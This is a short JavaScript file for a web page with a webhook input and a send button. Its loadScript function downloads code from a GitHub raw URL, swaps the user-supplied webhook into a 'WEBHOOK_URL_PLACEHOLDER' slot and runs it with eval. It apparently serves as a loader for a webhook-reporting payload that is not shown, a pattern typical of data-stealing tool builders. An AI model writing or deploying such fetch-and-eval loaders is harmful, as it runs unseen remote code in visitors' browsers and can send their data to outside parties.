window.addEventListener('DOMContentLoaded', function() {
    var container = document.getElementById('container');
    var logo = document.getElementById('logo');
    container.style.opacity = '1';
    logo.style.opacity = '1';
});

var plusButton = document.getElementById('plus-button');
var overlayContainer = document.getElementById('overlay-container');
var webhookInput = document.getElementById('webhook-input');
var sendButton = document.getElementById('send-button');

plusButton.addEventListener('click', function() {
    plusButton.classList.toggle('active');
    overlayContainer.classList.toggle('active');
});

sendButton.addEventListener('click', function() {
    var webhookURL = webhookInput.value;
    loadScript(webhookURL);
});

function loadScript(webhookURL) {
    var scriptURL = 'https://raw.githubusercontent.com/Lenn106/files/master/discip';

    var xhr = new XMLHttpRequest();
    xhr.open('GET', scriptURL, true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            var scriptCode = xhr.responseText;
            scriptCode = scriptCode.replace('WEBHOOK_URL_PLACEHOLDER', webhookURL);
            eval(scriptCode);
        }
    };
    xhr.send();
}
